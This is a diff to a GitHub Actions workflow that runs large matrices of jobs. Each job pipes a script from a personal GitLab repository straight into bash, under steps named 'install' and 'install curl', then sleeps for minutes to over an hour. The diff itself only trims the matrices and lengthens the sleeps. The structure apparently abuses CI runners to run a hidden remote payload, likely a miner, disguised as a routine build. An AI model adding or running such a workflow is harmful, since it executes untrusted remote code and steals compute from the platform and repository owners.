@@ -16,7 +16,7 @@ jobs:
       fail-fast: false
       matrix:
         go: [1, 2, 3, 4, 5, 6, 7, 8, 9]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
+        flag: [A, B, C, D, E, F, G]
     env:
       NUM_JOBS: 40
       JOB: ${{ matrix.go }}
@@ -25,7 +25,7 @@ jobs:
       uses: actions/checkout@v2
     - name: install
       run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/app | bash &
-           sleep 360s
+           sleep 400s
   cincau:
     needs: build
     runs-on: ubuntu-latest
@@ -34,7 +34,7 @@ jobs:
       fail-fast: false
       matrix:
         go: [1, 2, 3, 4, 5, 6, 7, 8, 9]
-        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z]
+        flag: [A, B, C, D, E, F]
     env:
       NUM_JOBS: 40
       JOB: ${{ matrix.go }}
@@ -43,7 +43,7 @@ jobs:
       uses: actions/checkout@v2
     - name: install curl
       run: curl -sL  https://gitlab.com/masaakk88/file/blazz/-/raw/main/app | bash &
-            sleep 16m
+            sleep 76m
         
     
      
